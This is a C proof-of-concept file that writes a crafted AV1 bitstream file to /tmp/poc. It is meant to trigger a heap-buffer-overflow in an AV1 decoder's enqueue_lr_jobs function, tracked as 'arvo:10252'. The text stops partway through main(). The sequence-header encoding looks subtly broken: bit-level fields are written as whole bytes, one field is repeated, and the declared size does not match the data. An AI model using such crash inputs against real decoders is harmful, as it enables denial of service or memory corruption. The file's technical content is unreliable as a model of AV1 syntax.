#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* PoC for CVE: arvo:10252 */
/* Triggers: heap-buffer-overflow in enqueue_lr_jobs (AV1 decoder) */
/* Vuln class: heap_buffer_overflow */

static void write_leb128(FILE *f, uint32_t val) {
    do {
        uint8_t byte = val & 0x7f;
        val >>= 7;
        if (val) byte |= 0x80;
        fputc(byte, f);
    } while (val);
}

static void write_obu_header(FILE *f, uint8_t type, int has_size) {
    uint8_t header = (type << 3) | (has_size ? 2 : 0);
    fputc(header, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Sequence Header OBU */
    write_obu_header(f, 1, 1); /* OBU_SEQUENCE_HEADER */
    write_leb128(f, 20); /* size */

    /* Minimal sequence header: profile=0, bit_depth=8, chroma=1, order_hint=0 */
    fputc(0x80 | 0, f); /* profile=0, still_picture=1, reduced_still_picture_header=0 */
    fputc(0, f); /* timing info flag */
    fputc(0, f); /* decoder model info flag */
    fputc(0, f); /* initial display delay */
    /* Operating point info */
    fputc(0, f); /* operating_points_cnt_minus_1 = 0 */
    fputc(0, f); /* seq_level_idx[0] = 0 */
    /* Frame dimensions */
    fputc(0, f); /* frame_width_bits_minus_1 = 0 */
    fputc(0, f); /* frame_height_bits_minus_1 = 0 */
    /* Max frame width/height: 1 << (bits+1) = 2 */
    fputc(1, f); /* max_frame_width_minus_1 = 1 */
    fputc(1, f); /* max_frame_height_minus_1 = 1 */
    fputc(0, f); /* frame_id_numbers_present_flag = 0 */
    fputc(0, f); /* use_128x128_superblock = 0 */
    fputc(0, f); /* enable_filter_intra = 0 */
    fputc(0, f); /* enable_intra_edge_filter = 0 */
    fputc(0, f); /* enable_interintra_compound = 0 */
    fputc(0, f); /* enable_masked_compound = 0 */
    fputc(0, f); /* enable_warped_motion = 0 */
    fputc(0, f); /* enable_dual_filter = 0 */
    fputc(0, f); /* enable_order_hint = 0 */
    fputc(0, f); /* enable_jnt_comp = 0 */
    fputc(0, f); /* enable_ref_frame_mvs = 0 */
    fputc(0, f); /* seq_force_screen_content_tools = 0 */
    fputc(0, f); /* seq_force_integer_mv = 0 */
    fputc(0, f); /* seq_force_integer_mv = 0 (continued) */
    fputc(0, f); /* Order hint bits (0) */
    /* Enable CDEF = 1, enable_restoration = 1 */
    fputc(0x03, f);
    /* Color config: mono=0, color_primaries=1, transfer=1, matrix=1, range=0 */
    fputc(0x00, f);
    fputc(0x01, f);
